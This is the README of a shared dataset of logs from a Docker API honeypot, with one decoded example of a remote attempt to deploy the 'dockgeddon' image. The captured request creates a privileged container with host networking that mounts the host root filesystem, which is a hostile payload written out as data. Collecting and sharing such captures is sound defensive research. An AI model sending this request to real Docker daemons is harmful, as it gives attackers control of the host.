# Docker Honeypot Logs

This is a set of logs collected from running a Docker honeypot on ports 2375 and 4243 (no SSL). The honeypot was written in Python/Flask and emulated a publicly accessible Docker instance. The emulator was designed to catch low-effort attempts by third parties to remotely deploy containers.


This data is being shared for public record / utility.  


## Example record
Data is stored by `port_[2375|4243]/dockerapi.[PORT].YYYY_MM_DD_HH.log`

Following is an example attempt by `202.102.95.13` to deploy an image named `megawebmaster/dockgeddon`.[1]

```
{
  "view_args": {
    "catchall": "v1.24/containers/create"
  },
  "url": "http://142.93.53.4:2375/v1.24/containers/create?name=dockgeddon",
  "headers": [
    [
      "Host",
      "142.93.53.4:2375"
    ],
    [
      "User-Agent",
      "Go-http-client/1.1"
    ],
    [
      "Content-Length",
      "1552"
    ],
    [
      "Content-Type",
      "application/json"
    ]
  ],
  "method": "POST",
  "source": "202.102.95.13",
  "data": "eyJIb3N0bmFtZSI6IiIsIkRvbWFpbm5hbWUiOiIiLCJVc2VyIjoiIiwiQXR0YWNoU3RkaW4iOmZhbHNlLCJBdHRhY2hTdGRvdXQiOmZhbHNlLCJBdHRhY2hTdGRlcnIiOmZhbHNlLCJUdHkiOmZhbHNlLCJPcGVuU3RkaW4iOmZhbHNlLCJTdGRpbk9uY2UiOmZhbHNlLCJFbnYiOm51bGwsIkNtZCI6bnVsbCwiSW1hZ2UiOiJtZWdhd2VibWFzdGVyL2RvY2tnZWRkb24iLCJWb2x1bWVzIjp7fSwiV29ya2luZ0RpciI6IiIsIkVudHJ5cG9pbnQiOm51bGwsIk9uQnVpbGQiOm51bGwsIkxhYmVscyI6e30sIkhvc3RDb25maWciOnsiQmluZHMiOlsiLzovaG9zdCJdLCJDb250YWluZXJJREZpbGUiOiIiLCJMb2dDb25maWciOnsiVHlwZSI6IiIsIkNvbmZpZyI6e319LCJOZXR3b3JrTW9kZSI6Imhvc3QiLCJQb3J0QmluZGluZ3MiOnt9LCJSZXN0YXJ0UG9saWN5Ijp7Ik5hbWUiOiJubyIsIk1heGltdW1SZXRyeUNvdW50IjowfSwiQXV0b1JlbW92ZSI6ZmFsc2UsIlZvbHVtZURyaXZlciI6IiIsIlZvbHVtZXNGcm9tIjpudWxsLCJDYXBBZGQiOm51bGwsIkNhcERyb3AiOm51bGwsIkNncm91cG5zTW9kZSI6IiIsIkRucyI6W10sIkRuc09wdGlvbnMiOltdLCJEbnNTZWFyY2giOltdLCJFeHRyYUhvc3RzIjpudWxsLCJHcm91cEFkZCI6bnVsbCwiSXBjTW9kZSI6IiIsIkNncm91cCI6IiIsIkxpbmtzIjpudWxsLCJPb21TY29yZUFkaiI6MCwiUGlkTW9kZSI6IiIsIlByaXZpbGVnZWQiOnRydWUsIlB1Ymxpc2hBbGxQb3J0cyI6ZmFsc2UsIlJlYWRvbmx5Um9vdGZzIjpmYWxzZSwiU2VjdXJpdHlPcHQiOm51bGwsIlVUU01vZGUiOiIiLCJVc2VybnNNb2RlIjoiIiwiU2htU2l6ZSI6MCwiQ29uc29sZVNpemUiOlswLDBdLCJJc29sYXRpb24iOiIiLCJDcHVTaGFyZXMiOjAsIk1lbW9yeSI6MCwiTmFub0NwdXMiOjAsIkNncm91cFBhcmVudCI6IiIsIkJsa2lvV2VpZ2h0IjowLCJCbGtpb1dlaWdodERldmljZSI6W10sIkJsa2lvRGV2aWNlUmVhZEJwcyI6bnVsbCwiQmxraW9EZXZpY2VXcml0ZUJwcyI6bnVsbCwiQmxraW9EZXZpY2VSZWFkSU9wcyI6bnVsbCwiQmxraW9EZXZpY2VXcml0ZUlPcHMiOm51bGwsIkNwdVBlcmlvZCI6MCwiQ3B1UXVvdGEiOjAsIkNwdVJlYWx0aW1lUGVyaW9kIjowLCJDcHVSZWFsdGltZVJ1bnRpbWUiOjAsIkNwdXNldENwdXMiOiIiLCJDcHVzZXRNZW1zIjoiIiwiRGV2aWNlcyI6W10sIkRldmljZUNncm91cFJ1bGVzIjpudWxsLCJEZXZpY2VSZXF1ZXN0cyI6bnVsbCwiS2VybmVsTWVtb3J5IjowLCJLZXJuZWxNZW1vcnlUQ1AiOjAsIk1lbW9yeVJlc2VydmF0aW9uIjowLCJNZW1vcnlTd2FwIjowLCJNZW1vcnlTd2FwcGluZXNzIjotMSwiT29tS2lsbERpc2FibGUiOmZhbHNlLCJQaWRzTGltaXQiOjAsIlVsaW1pdHMiOm51bGwsIkNwdUNvdW50IjowLCJDcHVQZXJjZW50IjowLCJJT01heGltdW1JT3BzIjowLCJJT01heGltdW1CYW5kd2lkdGgiOjAsIk1hc2tlZFBhdGhzIjpudWxsLCJSZWFkb25seVBhdGhzIjpudWxsfSwiTmV0d29ya2luZ0NvbmZpZyI6eyJFbmRwb2ludHNDb25maWciOnt9fSwiUGxhdGZvcm0iOm51bGx9Cg=="
}

```

The data value is base64 encoded and contains the container creation request:

```
{
    "Hostname": "",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": null,
    "Cmd": null,
    "Image": "megawebmaster/dockgeddon",
    "Volumes": {},
    "WorkingDir": "",
    "Entrypoint": null,
    "OnBuild": null,
    "Labels": {},
    "HostConfig": {
        "Binds": [
            "/:/host"
        ],
        "ContainerIDFile": "",
        "LogConfig": {
            "Type": "",
            "Config": {}
        },
        "NetworkMode": "host",
        "PortBindings": {},
        "RestartPolicy": {
            "Name": "no",
            "MaximumRetryCount": 0
        },
        "AutoRemove": false,
        "VolumeDriver": "",
        "VolumesFrom": null,

...

    "NetworkingConfig": {
        "EndpointsConfig": {}
    },
    "Platform": null
}
```


[1] https://www.lacework.com/blog/taking-teamtnt-docker-images-offline

